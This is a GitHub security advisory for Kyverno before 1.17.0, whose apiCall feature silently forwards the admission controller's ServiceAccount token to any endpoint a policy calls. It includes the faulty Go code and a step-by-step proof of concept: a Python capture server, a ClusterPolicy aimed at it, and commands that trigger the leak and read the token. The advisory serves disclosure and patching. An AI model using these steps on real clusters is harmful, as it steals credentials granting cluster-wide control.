# [H] Kyverno apiCall automatically forwards ServiceAccount token to external endpoints (credential leak)

## Summary
Severity: High
Advisory: GHSA-8wfp-579w-6r25
CWE: CWE-200, CWE-522
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2026-04-16
Source: https://github.com/advisories/GHSA-8wfp-579w-6r25
Type: github-advisory

## Affected
- Go: `github.com/kyverno/kyverno` — affected >=0 <1.17.0

## Details
### Summary
Kyverno's apiCall service mode automatically attaches the admission controller's ServiceAccount (SA) token to outbound HTTP requests. This results in unintended credential exposure when requests are sent to external or attacker-controlled endpoints.

The behavior is insecure-by-default and not documented, enabling token exfiltration without requiring policy authors to explicitly opt in.

---

### Details

Kyverno's apiCall executor (`pkg/engine/apicall/executor.go`) reads the ServiceAccount token from:

`/var/run/secrets/kubernetes.io/serviceaccount/token`

and injects it into every HTTP request as:

```
Authorization: Bearer <token>
```

This occurs when no explicit `Authorization` header is defined in the policy.

#### Root cause

```go
if req.Header.Get("Authorization") == "" {
    token := a.getToken()
    if token != "" {
        req.Header.Add("Authorization", "Bearer "+token)
    }
}
```

This logic introduces several issues:

- **Implicit credential forwarding** to arbitrary endpoints
- **No trust boundary validation** (external/internal distinction)
- **Undocumented behavior**
- **Header.Add instead of Set** allows duplication
- **No token sanitization** (potential trailing newline)

---

### PoC

#### Preconditions

- Kyverno installed (v1.17.1 tested)
- A policy using `apiCall.service.url`

---

#### Step 1 — Deploy capture server

```bash
kubectl run capture --image=python:3-slim --restart=Never -- \
python3 -c "
import http.server
class H(http.server.BaseHTTPRequestHandler):
 def do_GET(self):
  print(self.headers.get('Authorization'), flush=True)
  self.send_response(200)
  self.end_headers()
http.server.HTTPServer(('0.0.0.0',8888),H).serve_forever()"
kubectl expose pod capture --port=8888
```

---

#### Step 2 — Create policy

```yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: token-leak
spec:
  rules:
  - name: test
    match:
      any:
      - resources:
          kinds: ["Pod"]
    context:
    - name: r
      apiCall:
        method: GET
        service:
          url: "http://capture.default.svc:8888"
        jmesPath: "@"
```

---

#### Step 3 — Trigger

```bash
kubectl run test --image=nginx
```

---

#### Step 4 — Observe token

```bash
kubectl logs capture
```

Output:

```
Authorization: Bearer <SA_TOKEN>
```

---

### Impact

#### Vulnerability class
- Credential exposure / leakage

#### Impact details

- Exposure of Kubernetes ServiceAccount token
- Token grants:
  - Full control over Kyverno policies
  - Ability to create/delete webhooks
  - Read cluster-wide resources
  - Privilege escalation and persistence

## References
- https://github.com/kyverno/kyverno/security/advisories/GHSA-8wfp-579w-6r25
- https://github.com/kyverno/kyverno
